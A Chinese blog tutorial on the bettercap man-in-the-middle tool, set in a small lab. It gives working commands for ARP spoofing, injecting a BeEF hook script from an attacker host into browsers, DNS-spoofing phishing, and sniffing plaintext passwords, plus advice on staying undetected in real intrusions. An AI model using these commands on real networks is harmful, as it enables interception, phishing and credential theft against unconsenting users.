---
title: 轻量高效的 MITMF [ bettercap ]
date: 2017-11-07 07:25:29
tags: MITMF
categories: "bettercap"
author: klion
---

0x01 关于bettercap:
```
一款相对还不错的中间人工具,出来也有些年头了,不过貌似维护的并不是特别勤快
从名字就不难看出,作者似乎是有意在向我们说明,这是一款比ettercap更好的中间人工具,'b' is better ^_^
此外,工具本身基于ruby,官方要求的 ruby版本为 >= 1.9
```

0x02 基本介绍:
```
ubuntu 16.04.3 LTS 	ip: 192.168.3.12    入侵者机器
win2008r2cn		ip: 192.168.3.23    模拟正常服务器,事先已准备好各种服务
win2008cn		ip: 192.168.3.131   模拟正常服务器,事先已准备好各种服务
win2012r2cn		ip: 192.168.3.122   模拟正常服务器,事先已准备好各种服务
```

0x03 首先,安装好bettercap,如果你系统的ruby版本小于1.9记得务必先升级一下,更多详情请参考其官方说明,如下
```
# apt-add-repository ppa:brightbox/ruby-ng
# apt-get update
# apt-get install ruby2.3 ruby2.3-dev
```
<!-- more -->

安装一些必要的基础依赖库
```
# apt-get install build-essential ruby-dev libpcap-dev net-tools
```

通过gem安装bettercap,安装成功后,我们就可以继续后面的内容了
```
# gem install bettercap
# echo $?
```
![''](/img/bettercap_res.png)

0x04 常规选项用法:
```
-I		指定要嗅探欺骗的网卡接口
--use-mac	使用自定义mac
--random-mac	使用随机mac
-G		指定网关ip
-T 		指定要嗅探的目标机器,可以是单个机器,亦可是多个机器,默认不指定会直接欺骗同内网下的所有机器[不过,实际中最好不要这样干]
--no-discovery	不启用主机发现模块,直接使用当前机器的arp缓存[即arp -a的内容],默认会自动启动
-O		将流过的所有数据都记录到指定的文件中,在实战中建议指定该选项,便于后续下载到本地仔细分析
```

0x05 主要功能选项[欺骗及嗅探器]:
```
-S  启用欺骗功能,默认就会开启,且默认使用的是ARP欺骗,你也可以用更偏上层协议,如,ICMP,HSRP...
-X  启用嗅探器,注意,光启用spoofer单单只是让其它机器的流量经过自己,而嗅探器则是用来抓取这些流量中的密码
-P  抓取指定类型的数据,主要是针对各类明文密码及访问记录,如,FTP,POST,MYSQL...默认会抓取所有类型,为了利于后期分析,建议指定类型
```

0x06 使用各种协议的透明代理功能,我们可以拿它来观察目标机器的访问记录,甚至可以直接往里注入恶意流量,注意,当http代理功能开启后,ssltrip也会自动开启:
```
--proxy	 启用http代理,这个也可能是最常用的,除了http,它也支持https,tcp,udp及自定义代理流量
--proxy-module injecthtml,injectjs,redirect,injectcss	往来回的http流量中注入恶意数据
```

如,在来往的的http流量中注入恶意js,主动让同内网下的所有浏览器上线,这里只是为了简单演示效果,才用的beef,实际中可以换成更好一点的xss平台,从上面选项中我们看到,除了注入js,html,css都是支持的
```
# bettercap -I ens33 -S ARP --proxy --proxy-module injectjs --js-url "http://*.3.10:3000/hook.js" -G 192.168.3.1 -T 192.168.3.120-135
```
![''](/img/bettercap_injection.png)
![''](/img/bettercap_injection_res.png)

0x07 利用`http server`和`--dns`功能,进行dns欺骗进行钓鱼,这里有个不好的地方,就是dns缓存会在目标机器上持续很久,必须手工刷新缓存才行,而且被劫持以后,当用户访问别的域名有时是访问不了的,另外,bettercap似乎并不依靠系统内核进行转发,挺好

编辑dns解析文件,意思就是将所有访问freebuf.com的流量都重定向到本地的web服务器上
```
# vi dns.txt
  local .*freebuf\.com
```

```
# bettercap --httpd --httpd-port 80 --httpd-path=/root/hacked.html --dns dns.conf
# ipconfig /flushdns	污染完了以后,记得顺手把dns缓存清一下
```
![''](/img/bettercap_dns.png)
![''](/img/bettercap_dns_res.png)

0x08 其它的一些常规用法

尝试抓取http POST数据中的各类明文密码:
```
# bettercap -I ens33 -S ARP -X -P POST -G 192.168.3.1 -T 192.168.3.131
```
![''](/img/bettercap_http.png)
![''](/img/bettercap_http_admin.png)
![''](/img/bettercap_http_res.png)

抓各类服务明文及hash,这里只是随便演示几个,支持的服务和工具比较多,不过用法都非常简单,大家可执行查看其帮助:
```
# bettercap -I ens33 -S ARP -X -P "MAIL,FTP,MYSQL" -G 192.168.3.1 -T 192.168.3.120-135
```
![''](/img/bettercap_pass_ftp.png)
![''](/img/bettercap_pass_mysql.png)

<br>
小结:
&nbsp;&nbsp;&nbsp;&nbsp;工具基本属于全程傻瓜化的那种,虽然,目前还有些小瑕疵,不过用用还是可以的,在实战中可能最多就是用它来抓抓密码,自己实战中也用过几次,说实话,效果并没想象的那么好,其它的那些花哨功能,在实战也并不太建议用,内网毕竟不像web,稍有不慎,极易被发现,权限万一丢了,再想拿回来就费劲了,一切还以稳定为主,另外,工具比较轻量[起码自己感觉确实比ettercap温柔多了,暂时还没出现过把对方搞掉的情况],程序结构化非常分明,用什么开什么即可,避免动静过大,有些功能可能会默认开,如`spoofer 功能`,如果没必要用它,直接`-S NONE`即可,废话不多讲,大家还是自行在实战中多多体会吧,另外,由于篇幅原因,没法每一项都介绍的非常详细,官方已经为我们提供了非常详细的使用说明,英文还可以的朋友,可以直接去读一手文档,相信只要不是英文烂到没朋友的那种,基本都能轻松看懂,其实,自己很多也都是参考其官方文档来的,最后,如果目标是Ubuntu14.04以上的系统还是非常值得尝试的,否则这个ruby环境在其它系统中搞起来可能会比较麻烦,祝好运 ^_^

